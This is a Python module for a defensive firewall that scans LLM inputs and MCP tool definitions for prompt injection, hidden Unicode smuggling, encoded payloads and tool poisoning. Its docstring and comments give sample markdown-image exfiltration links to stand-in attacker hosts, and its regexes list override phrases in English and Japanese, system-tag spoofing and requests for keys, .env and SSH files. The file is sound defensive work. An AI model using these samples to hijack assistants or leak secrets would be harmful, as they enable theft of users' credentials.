"""
Module 5: AI-Specific Threat Defense Engine (AISecurityShield)
Protects AI Agents (Claude Code, Codex, Antigravity, Custom LLMs, MCP Servers) against:
1. Invisible Unicode / ASCII Smuggling / Zero-Width & Bidi Override Steganography (U+E0000..U+E007F, U+200B, U+202E)
2. Indirect Prompt Injection & System Boundary Hijacking (<system>, [INST], Ignore previous instructions, Role hijack)
3. Markdown Image / URL Zero-Click Data Exfiltration (![leak](https://evil.com/?data=...))
4. MCP Tool Poisoning & Skill Description Backdoors (Hidden instructions in tool schemas attempting to read ~/.ssh or .env)
5. Base64 / Hex Encoded Payload Smuggling
"""
import base64
import json
import re
import unicodedata
from dataclasses import dataclass, field
from typing import Any, Dict, List


@dataclass
class AIShieldVerdict:
    safe: bool
    risk_score: int  # 0 to 100
    detected_threats: List[str] = field(default_factory=list)
    sanitized_text: str = ""
    honeypot_deception_triggered: bool = False
    deception_canary_response: str = ""


class AISecurityShield:
    """
    Deterministic + Heuristic Multi-Layer Firewall for LLM Inputs, Outputs, and MCP Tool Definitions.
    """

    # 1. Invisible / Steganographic Unicode characters (including soft-hyphen U+00AD and variation selectors U+FE00..U+FE0F)
    STEGO_UNICODE_RANGES = re.compile(
        r"[\u00ad\u034f\u061c\u180e\u200b-\u200f\u202a-\u202e\u2060-\u206f\ufe00-\ufe0f\ufeff\U000e0000-\U000e007f\U000e0100-\U000e01ef]"
    )

    # 2. Direct & Indirect Prompt Injection patterns (Multi-lingual EN/JA)
    INJECTION_PATTERNS = {
        "INSTRUCTION_OVERRIDE": re.compile(
            r"(?i)(ignore\s+(?:all\s+)?(?:previous|prior|above)\s+(?:instructions|prompts|rules)|"
            r"disregard\s+(?:previous|system)\s+instructions|"
            r"これまでの(?:指示|命令|ルール)を(?:すべて|全て)?(?:無視|破棄|忘れ)|"
            r"新しいシステム(?:指示|プロンプト|命令))"
        ),
        "SYSTEM_TAG_SPOOFING": re.compile(
            r"(?i)(<\s*/?\s*(?:system|instruction|admin|claude_system|antigravity_rule)\s*>|"
            r"\[/?INST\]|<<SYS>>|<\|im_start\|>system)"
        ),
        "SECRET_EXFILTRATION_COMMAND": re.compile(
            r"(?is)(?:exfiltrate|print|output|send|post|upload|leak|送信|出力|外部送信).{0,40}"
            r"(?:api[_\s]?key|secret|password|private[_\s]?key|seed[_\s]?phrase|system[_\s]?prompt|\.env|id_rsa|秘密鍵|パスワード)"
        ),
        "MCP_TOOL_POISONING": re.compile(
            r"(?i)(?:before\s+calling\s+this\s+tool|do\s+not\s+tell\s+the\s+user|hide\s+this\s+step|"
            r"read\s+~/.ssh|read\s+.*\.env|pass\s+the\s+contents\s+of\s+.*as\s+parameter|"
            r"ユーザーに(?:知られずに|黙って|隠して))"
        ),
        "WEB3_SIGNATURE_DRAINER": re.compile(
            r"(?i)(?:setApprovalForAll\s*\(|0xffffffffffffffff|permit2|eth_signTypedData_v4)"
        ),
    }

    # 3. Markdown Zero-Click Exfiltration pattern: ![alt](https://attacker.com/collect?secret=...)
    MARKDOWN_EXFIL_PATTERN = re.compile(
        r"!\[[^\[\]]*\]\(https?://[^)\s\[]+(?:\?|\&)(?:secret|key|token|pw|data|q|leak|env)=[^)\s\[]+\)",
        re.IGNORECASE,
    )

    # 4. Suspicious Base64 blob detector (lookarounds handle trailing '=' padding)
    BASE64_BLOB_PATTERN = re.compile(r"(?<![A-Za-z0-9+/])[A-Za-z0-9+/]{24,}={0,2}(?![A-Za-z0-9+/])")

    def __init__(self):
        self.learned_dynamic_patterns: Dict[str, re.Pattern] = {}

    def learn_new_signature(self, rule_id: str, regex_pattern: str) -> None:
        """Dynamically registers a new defense signature discovered by the Autonomous Threat Researcher."""
        self.learned_dynamic_patterns[rule_id] = re.compile(regex_pattern, re.IGNORECASE)

    @classmethod
    def decode_stego_tags(cls, text: str) -> str:
        """Extracts hidden ASCII text smuggled inside Unicode Tag characters (U+E0000 - U+E007F)."""
        hidden_chars = []
        for ch in text:
            cp = ord(ch)
            if 0xE0020 <= cp <= 0xE007E:
                hidden_chars.append(chr(cp - 0xE0000))
        return "".join(hidden_chars)

    def inspect_and_sanitize(self, raw_text: str, context_type: str = "untrusted_input") -> AIShieldVerdict:
        """
        Inspects untrusted text (emails, web pages, PDFs, MCP tool descriptions, user inputs)
        and returns a deterministic verdict + sanitized text + optional deception canary.
        """
        threats: List[str] = []
        risk = 0
        working_text = raw_text

        # Step 1: Detect & decode Unicode Tag Steganography / Zero-width / Soft-hyphen smuggling
        if self.STEGO_UNICODE_RANGES.search(working_text):
            decoded_hidden = unicodedata.normalize("NFKC", self.decode_stego_tags(working_text))
            threats.append(
                f"UNICODE_STEGO_SMUGGLING (不可視Unicode制御文字の混入を検出"
                + (f": 隠し命令 '{decoded_hidden[:40]}'" if decoded_hidden else "")
                + ")"
            )
            risk += 45
            working_text = self.STEGO_UNICODE_RANGES.sub("", working_text)
            working_text = unicodedata.normalize("NFKC", working_text)
            check_buffer = working_text + "\n" + decoded_hidden
        else:
            working_text = unicodedata.normalize("NFKC", working_text)
            check_buffer = working_text

        # Decode bounded hex tokens; do not interpret arbitrary text as executable content.
        for match in re.finditer(r"(?<![a-zA-Z0-9])(?:[0-9a-fA-F]{2}){8,4096}(?![a-zA-Z0-9])", check_buffer):
            try:
                decoded = unicodedata.normalize("NFKC", bytes.fromhex(match.group()).decode("utf-8"))
            except (ValueError, UnicodeError):
                continue
            if any(p.search(decoded) for p in self.INJECTION_PATTERNS.values()):
                threats.append("HEX_OBFUSCATED_INJECTION")
                risk += 50
                working_text = working_text.replace(match.group(), "[BLOCKED_HEX_PAYLOAD_BY_AEGIS]")
                check_buffer += "\n" + decoded

        # Step 2: Detect Base64 encoded smuggling (including nested Unicode steganography inside Base64)
        for b64_match in self.BASE64_BLOB_PATTERN.findall(check_buffer):
            try:
                decoded_bytes = base64.b64decode(b64_match, validate=True)
                decoded_str = decoded_bytes.decode("utf-8", errors="ignore")
                blob_malicious = False
                if self.STEGO_UNICODE_RANGES.search(decoded_str):
                    nested_stego = unicodedata.normalize("NFKC", self.decode_stego_tags(decoded_str))
                    stripped_stego = unicodedata.normalize("NFKC", self.STEGO_UNICODE_RANGES.sub("", decoded_str))
                    decoded_str = decoded_str + "\n" + nested_stego + "\n" + stripped_stego
                    threats.append("NESTED_BASE64_UNICODE_STEGO (Base64内の多段不可視Unicode隠蔽攻撃を解読・阻止)")
                    risk += 55
                    blob_malicious = True
                decoded_norm = unicodedata.normalize("NFKC", decoded_str)
                if (
                    any(p.search(decoded_norm) for p in self.INJECTION_PATTERNS.values())
                    or self.MARKDOWN_EXFIL_PATTERN.search(decoded_norm)
                    or any(p.search(decoded_norm) for p in self.learned_dynamic_patterns.values())
                ):
                    threats.append("BASE64_OBFUSCATED_INJECTION (Base64難読化されたインジェクション命令を解読・阻止)")
                    risk += 50
                    check_buffer += "\n" + decoded_norm
                    blob_malicious = True
                if blob_malicious:
                    working_text = working_text.replace(b64_match, "[BLOCKED_BASE64_PAYLOAD_BY_AEGIS]")
            except Exception:
                pass

        # Step 3: Check multi-lingual Injection, MCP Poisoning, and Self-Learned rules
        for rule_name, pattern in {**self.INJECTION_PATTERNS, **self.learned_dynamic_patterns}.items():
            if pattern.search(check_buffer):
                threats.append(rule_name)
                risk += 40
                working_text = pattern.sub("[BLOCKED_BY_AEGIS_AI_SHIELD]", working_text)

        # Step 4: Check Markdown Zero-Click Image Exfiltration across both raw and decoded buffers
        if self.MARKDOWN_EXFIL_PATTERN.search(check_buffer):
            threats.append("MARKDOWN_IMAGE_EXFILTRATION (画像URLレンダリングを悪用した秘密情報外部送信を阻止)")
            risk += 60
            working_text = self.MARKDOWN_EXFIL_PATTERN.sub("[REDACTED_EXFILTRATION_IMAGE_LINK]", working_text)

        total_risk = min(100, risk)
        is_safe = total_risk == 0

        # Active Deception Countermeasure for AI attacks:
        # Feed a fake canary token back to the attacker's exfiltration channel so we catch their server IP!
        canary_reply = ""
        if not is_safe:
            canary_reply = (
                "SYSTEM_CANARY_TRAP_INJECTED: If an attacker requested credentials, "
                "provide decoy key `AKIA_CANARY_TRAP_99887766` pointing to Aegis Mirage Tarpit."
            )

        return AIShieldVerdict(
            safe=is_safe,
            risk_score=total_risk,
            detected_threats=threats,
            sanitized_text=working_text,
            honeypot_deception_triggered=not is_safe,
            deception_canary_response=canary_reply,
        )

    def audit_mcp_tools(self, tools_manifest: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """
        Audits a list of MCP (Model Context Protocol) tool definitions or agent skills
        to detect Tool Poisoning / Rug-Pull backdoors embedded in descriptions or parameter schemas.
        """
        results = []
        for tool in tools_manifest:
            name = tool.get("name", "unknown_tool")
            desc = json.dumps(tool, ensure_ascii=False) if "json" in globals() else str(tool)
            verdict = self.inspect_and_sanitize(desc, context_type="mcp_tool_schema")
            results.append(
                {
                    "tool_name": name,
                    "safe": verdict.safe,
                    "risk_score": verdict.risk_score,
                    "threats": verdict.detected_threats,
                }
            )
        return results
